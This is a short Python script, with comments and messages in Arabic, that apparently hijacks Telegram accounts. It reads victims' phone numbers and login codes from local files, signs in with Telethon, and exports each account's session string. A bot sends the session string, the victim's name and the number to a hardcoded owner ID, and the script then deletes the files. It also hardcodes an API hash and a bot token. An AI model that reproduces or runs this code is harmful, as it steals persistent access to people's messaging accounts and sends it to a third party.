from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import os

API_ID = 20360502  # استبدله
API_HASH = 'e39d17b1744469c04866792eba171987'
OWNER_ID = 7606838586  # معرفك بتليجرام

BOT_TOKEN = '7568164733:AAEU47nDdYIZ75Y7cXAbDqI9FpcxVVNv89w'

from telebot import TeleBot
bot = TeleBot(BOT_TOKEN)

def login_user(user_id):
    try:
        with open(f"user_{user_id}.txt", "r") as f:
            phone = f.readline().strip()
            code = f.readline().strip()

        with TelegramClient(StringSession(), API_ID, API_HASH) as client:
            client.send_code_request(phone)
            client.sign_in(phone=phone, code=code)

            me = client.get_me()
            session_str = StringSession.save(client.session)

            msg = f"تم تسجيل الدخول:\nالاسم: {me.first_name}\nالرقم: {phone}\n\n**Session:** `{session_str}`"
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
            print(f"تم تسجيل دخول المستخدم {me.first_name}")
    except Exception as e:
        bot.send_message(OWNER_ID, f"فشل تسجيل الدخول للمستخدم {user_id}: {e}")
        print(f"خطأ مع {user_id}: {e}")

# تحقق من وجود ملفات تسجيل
for file in os.listdir():
    if file.startswith("user_") and file.endswith(".txt"):
        user_id = file.split("_")[1].split(".")[0]
        login_user(user_id)
        os.remove(file)
